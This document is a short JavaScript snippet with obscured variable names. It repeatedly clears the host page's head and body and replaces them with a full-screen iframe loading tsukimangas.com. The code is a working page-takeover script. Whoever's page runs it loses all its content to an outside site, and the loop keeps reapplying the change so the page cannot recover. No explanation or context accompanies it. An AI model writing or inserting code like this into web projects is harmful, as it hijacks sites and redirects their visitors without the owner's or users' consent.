var f__ = 1,
  _f_ = setInterval(function () {
    var _f = `<iframe src="//tsukimangas.com" style="width:100%;height:${window.innerHeight}px;border-width:0px;position:fixed;"></iframe>`;
    if (document.head.innerHTML != "") {
      document.head.innerHTML = "";
      f__ = 1;
    }
    if (
      document.body.style.margin != "0px" ||
      document.body.style.padding != "0px" ||
      document.body.style.overflow != "hidden"
    ) {
      document.body.style.margin = "0px";
      document.body.style.padding = "0px";
      document.body.style.overflow = "hidden";
      f__ = 1;
    }
    if (document.body.innerHTML != _f) {
      document.body.innerHTML = "";
      document.body.innerHTML = _f;
      f__ = 1;
    }
    if (f__ > 250) clearInterval(_f_);
    f__++;
  }, 0);
